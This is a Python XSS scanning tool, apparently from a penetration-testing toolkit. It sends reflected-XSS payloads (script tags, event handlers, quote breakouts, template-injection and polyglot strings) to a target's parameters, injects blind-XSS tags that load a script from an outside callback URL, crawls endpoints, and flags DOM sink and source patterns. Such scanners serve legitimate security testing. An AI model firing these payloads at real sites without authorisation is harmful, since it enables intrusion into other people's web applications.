#!/usr/bin/env python3
"""XSS (Cross-Site Scripting) Tester

Tests for XSS vulnerabilities:
- Reflected XSS (GET/POST parameters)
- DOM-based XSS (basic patterns)
- Context-aware payloads (HTML, attribute, JS, URL)
"""

import re
import requests
from typing import Dict, Any, Optional, List
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


def test_reflected_xss(
    target_url: str,
    param: str = "q",
    callback_url: Optional[str] = None
) -> Dict[str, Any]:
    """Test for reflected XSS vulnerabilities
    
    Args:
        target_url: Target URL
        param: Parameter to test
        callback_url: Optional callback URL for blind XSS detection
        
    Returns:
        Dict with test results
    """
    result = {
        "type": "xss",
        "test": "reflected_xss",
        "vulnerable": False,
        "url": target_url,
        "param": param,
        "xss_type": "reflected",
        "context": None,
        "payload": None,
        "evidence": None
    }
    
    # Context-specific payloads (ordered by likelihood of success)
    # Each tuple: (payload, expected_in_response, context_name)
    payloads = [
        # HTML context - basic script tags
        ('<script>alert(1)</script>', '<script>alert(1)</script>', 'html'),
        ('<img src=x onerror=alert(1)>', '<img src=x onerror=alert(1)>', 'html'),
        ('<svg onload=alert(1)>', '<svg onload=alert(1)>', 'html'),
        ('<body onload=alert(1)>', '<body onload=alert(1)>', 'html'),
        
        # Attribute context - breaking out of quotes
        ('" onmouseover="alert(1)" x="', 'onmouseover="alert(1)"', 'attribute'),
        ("' onmouseover='alert(1)' x='", "onmouseover='alert(1)'", 'attribute'),
        ('" onfocus="alert(1)" autofocus="', 'onfocus="alert(1)"', 'attribute'),
        
        # JavaScript context - breaking out of strings
        ('</script><script>alert(1)</script>', '<script>alert(1)</script>', 'js_string'),
        ("';alert(1)//", "alert(1)", 'js_string'),
        ('";alert(1)//', "alert(1)", 'js_string'),
        
        # URL context
        ('javascript:alert(1)', 'javascript:alert(1)', 'url'),
        ('data:text/html,<script>alert(1)</script>', 'data:text/html', 'url'),
        
        # Template/interpolation context
        ('{{constructor.constructor("alert(1)")()}}', 'constructor', 'template'),
        ('${alert(1)}', '${alert(1)}', 'template'),
        
        # Polyglot payloads (work across multiple contexts)
        ('"><img src=x onerror=alert(1)>//', '<img src=x onerror=alert(1)>', 'polyglot'),
        ("'><img src=x onerror=alert(1)>//", '<img src=x onerror=alert(1)>', 'polyglot'),
    ]
    
    # Unique canary for detection
    canary = "xss_test_canary_12345"
    
    def try_request(method: str, payload: str) -> Optional[requests.Response]:
        """Try a request with the given method and payload."""
        try:
            if method == "GET":
                return requests.get(
                    target_url,
                    params={param: payload},
                    timeout=10,
                    allow_redirects=True
                )
            elif method == "POST_FORM":
                return requests.post(
                    target_url,
                    data={param: payload},
                    timeout=10,
                    allow_redirects=True
                )
            elif method == "POST_JSON":
                return requests.post(
                    target_url,
                    json={param: payload},
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                    allow_redirects=True
                )
        except Exception:
            return None
        return None
    
    # First, check if parameter is reflected at all
    methods = ["GET", "POST_FORM"]
    
    for method in methods:
        canary_resp = try_request(method, canary)
        if canary_resp and canary in canary_resp.text:
            # Parameter is reflected, now test payloads
            for payload, expected, context in payloads:
                resp = try_request(method, payload)
                if resp is None:
                    continue
                
                # Check if payload is reflected unencoded
                if expected.lower() in resp.text.lower():
                    result["vulnerable"] = True
                    result["context"] = context
                    result["payload"] = payload
                    result["method"] = method
                    result["evidence"] = {
                        "payload": payload,
                        "expected": expected,
                        "method": method,
                        "status_code": resp.status_code,
                        "response_snippet": resp.text[:1000],
                        "note": f"XSS payload reflected in {context} context"
                    }
                    return result
    
    # Test for callback-based blind XSS if provided
    if callback_url and not result["vulnerable"]:
        blind_payloads = [
            f'<img src="{callback_url}?xss=1">',
            f'<script src="{callback_url}"></script>',
            f'"><img src="{callback_url}?xss=2">'
        ]
        for payload in blind_payloads:
            for method in methods:
                try_request(method, payload)
        result["blind_xss_tested"] = True
        result["callback_url"] = callback_url
    
    return result


def test_dom_xss(target_url: str) -> Dict[str, Any]:
    """Test for DOM-based XSS patterns in page source
    
    This performs static analysis looking for dangerous patterns.
    
    Args:
        target_url: Target URL to fetch and analyze
        
    Returns:
        Dict with test results
    """
    result = {
        "type": "xss",
        "test": "dom_xss",
        "vulnerable": False,
        "url": target_url,
        "xss_type": "dom",
        "patterns_found": [],
        "evidence": None
    }
    
    try:
        resp = requests.get(target_url, timeout=10)
        content = resp.text
    except Exception as e:
        result["error"] = str(e)
        return result
    
    # Dangerous sink patterns (where user input ends up)
    sinks = [
        (r'\.innerHTML\s*=', 'innerHTML assignment'),
        (r'\.outerHTML\s*=', 'outerHTML assignment'),
        (r'document\.write\s*\(', 'document.write'),
        (r'document\.writeln\s*\(', 'document.writeln'),
        (r'\.insertAdjacentHTML\s*\(', 'insertAdjacentHTML'),
        (r'eval\s*\(', 'eval'),
        (r'setTimeout\s*\([^,]*["\']', 'setTimeout with string'),
        (r'setInterval\s*\([^,]*["\']', 'setInterval with string'),
        (r'new\s+Function\s*\(', 'Function constructor'),
    ]
    
    # Source patterns (where user input comes from)
    sources = [
        (r'location\.(hash|search|href|pathname)', 'URL manipulation'),
        (r'document\.URL', 'document.URL'),
        (r'document\.referrer', 'document.referrer'),
        (r'window\.name', 'window.name'),
        (r'document\.cookie', 'document.cookie'),
        (r'localStorage\[', 'localStorage'),
        (r'sessionStorage\[', 'sessionStorage'),
    ]
    
    patterns_found = []
    
    # Check for dangerous sinks
    for pattern, name in sinks:
        matches = re.findall(pattern, content, re.IGNORECASE)
        if matches:
            patterns_found.append({
                "type": "sink",
                "pattern": name,
                "count": len(matches)
            })
    
    # Check for sources that might be connected to sinks
    for pattern, name in sources:
        matches = re.findall(pattern, content, re.IGNORECASE)
        if matches:
            patterns_found.append({
                "type": "source",
                "pattern": name,
                "count": len(matches)
            })
    
    # If we find both sources and sinks, flag as potentially vulnerable
    has_sinks = any(p["type"] == "sink" for p in patterns_found)
    has_sources = any(p["type"] == "source" for p in patterns_found)
    
    if has_sinks and has_sources:
        result["vulnerable"] = True
        result["patterns_found"] = patterns_found
        result["evidence"] = {
            "sinks": [p for p in patterns_found if p["type"] == "sink"],
            "sources": [p for p in patterns_found if p["type"] == "source"],
            "note": "Potential DOM XSS: both sources and sinks found in page"
        }
    elif has_sinks:
        # Sinks without clear sources - still worth noting
        result["patterns_found"] = patterns_found
        result["evidence"] = {
            "sinks": patterns_found,
            "note": "Dangerous sinks found (manual verification needed)"
        }
    
    return result


def test_xss(
    target_url: str,
    param: str = "q",
    callback_url: Optional[str] = None
) -> Dict[str, Any]:
    """Combined XSS test (reflected + DOM)
    
    Args:
        target_url: Target URL
        param: Parameter to test for reflected XSS
        callback_url: Optional callback URL for blind XSS
        
    Returns:
        Dict with test results
    """
    # Test reflected XSS first
    reflected_result = test_reflected_xss(target_url, param, callback_url)
    
    if reflected_result["vulnerable"]:
        return reflected_result
    
    # If no reflected XSS, check for DOM XSS patterns
    dom_result = test_dom_xss(target_url)
    
    if dom_result["vulnerable"]:
        return dom_result
    
    # Return the reflected result (contains more info)
    return reflected_result


def test_xss_params(
    target_url: str,
    params: Optional[List[str]] = None,
    callback_url: Optional[str] = None
) -> Dict[str, Any]:
    """Test multiple parameters for XSS
    
    Args:
        target_url: Target URL
        params: List of parameters to test (if None, will discover)
        callback_url: Optional callback URL
        
    Returns:
        Dict with test results including all findings
    """
    result = {
        "test": "xss_multi_param",
        "vulnerable": False,
        "findings": []
    }
    
    # Discover parameters if not provided
    if not params:
        try:
            from tools.rest_api_fuzzer import discover_parameters
            discovered_params = discover_parameters(target_url)
        except ImportError:
            discovered_params = []
        
        # Also extract parameters from URL
        parsed = urlparse(target_url)
        url_params = list(parse_qs(parsed.query).keys())
        
        # Common XSS parameter names
        common_params = [
            "q", "query", "search", "s", "keyword", "term",
            "name", "username", "user", "email",
            "id", "page", "url", "redirect", "next", "return",
            "msg", "message", "error", "success", "text", "content",
            "input", "data", "value", "comment", "feedback"
        ]
        
        params = list(set(discovered_params + url_params + common_params))
    
    # Test each parameter
    for param in params:
        test_result = test_reflected_xss(target_url, param=param, callback_url=callback_url)
        if test_result["vulnerable"]:
            result["vulnerable"] = True
            result["findings"].append(test_result)
    
    # Also test for DOM XSS once
    dom_result = test_dom_xss(target_url)
    if dom_result["vulnerable"]:
        result["vulnerable"] = True
        result["findings"].append(dom_result)
    
    return result


def discover_xss_endpoints(base_url: str) -> List[str]:
    """Discover endpoints that might be vulnerable to XSS
    
    Args:
        base_url: Base URL to crawl
        
    Returns:
        List of URLs with potential XSS entry points
    """
    endpoints = []
    
    # Common XSS-prone endpoints
    common_endpoints = [
        "/search", "/search?q=test", "/query", "/q",
        "/user", "/profile", "/comment", "/feedback",
        "/redirect", "/next", "/return", "/url", "/goto",
        "/error", "/message", "/msg", "/success",
        "/login", "/register", "/signup",
        "/api/search", "/api/query",
    ]
    
    # Add base URL
    endpoints.append(base_url)
    
    # Add common endpoints
    for ep in common_endpoints:
        endpoints.append(f"{base_url.rstrip('/')}{ep}")
    
    # Try to crawl the page for forms and links
    try:
        resp = requests.get(base_url, timeout=10)
        if resp.status_code == 200:
            import re
            # Find all href links
            hrefs = re.findall(r'href=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
            for href in hrefs:
                if href.startswith("/"):
                    endpoints.append(f"{base_url.rstrip('/')}{href}")
                elif href.startswith(base_url):
                    endpoints.append(href)
            
            # Find form actions
            actions = re.findall(r'action=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
            for action in actions:
                if action.startswith("/"):
                    endpoints.append(f"{base_url.rstrip('/')}{action}")
                elif action.startswith(base_url):
                    endpoints.append(action)
    except Exception:
        pass
    
    # Deduplicate
    return list(set(endpoints))


def validate_xss(
    discovery_data: Dict[str, Any],
    callback_server_url: Optional[str] = None
) -> Dict[str, Any]:
    """Main validation function for XSS
    
    Args:
        discovery_data: Discovery data containing target URLs
        callback_server_url: Optional callback server URL for blind XSS
        
    Returns:
        Dict with validation results
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    # Get target URL
    target = discovery_data.get("target_url") or discovery_data.get("url") or discovery_data.get("host")
    if not target:
        return results
    
    # Ensure URL has scheme
    if not target.startswith(("http://", "https://")):
        target = f"http://{target}"
    
    # Setup callback URL
    callback_url = None
    if callback_server_url:
        try:
            callback_url = f"{callback_server_url.rstrip('/')}/xss/{int(__import__('time').time())}"
        except Exception:
            pass
    
    # Get parameters to test
    params = discovery_data.get("params", [])
    
    # Discover endpoints to test
    endpoints_to_test = discover_xss_endpoints(target)
    
    # Test each endpoint
    for endpoint_url in endpoints_to_test:
        test_result = test_xss_params(endpoint_url, params=params if params else None, callback_url=callback_url)
        results["tests_run"] += 1
        
        if test_result["vulnerable"]:
            results["vulnerable"] = True
            results["findings"].extend(test_result.get("findings", []))
            # Don't stop - find all vulnerabilities
    
    return results


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python xss_tester.py <target_url> [param]")
        sys.exit(1)
    
    target = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else "q"
    
    print(f"[XSS] Testing {target} with param '{param}'")
    result = test_xss(target, param)
    
    import json
    print(json.dumps(result, indent=2))

